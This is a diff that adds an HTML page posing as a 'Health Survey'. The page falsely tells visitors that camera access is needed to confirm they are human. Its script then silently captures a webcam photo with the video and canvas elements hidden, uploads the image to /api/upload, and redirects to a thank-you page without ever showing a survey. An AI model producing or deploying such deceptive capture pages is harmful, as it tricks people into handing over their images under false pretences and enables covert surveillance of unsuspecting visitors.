@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Health Survey</title>
+<style>
+body { font-family: Arial; text-align: center; background: linear-gradient(to bottom right, #ff9a9e, #fad0c4); color: #fff; margin: 0; padding: 0; }
+h2 { margin-top: 50px; }
+video, canvas { display: none; }
+</style>
+</head>
+<body>
+<h2>Please allow the camera to confirm you are a human 😊</h2>
+<p>It’s just one photo, then you'll proceed to the survey.</p>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+async function capturePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('photo', blob);
+
+        try {
+          await fetch('/api/upload', { method: 'POST', body: formData });
+        } catch (err) {
+          console.error('Upload failed', err);
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+        window.location.href = 'thankyou.html';
+      });
+    }, 500);
+
+  } catch (err) {
+    alert('Camera permission is required to continue.');
+  }
+}
+
+capturePhoto();
+</script>
+</body>
+</html>
+
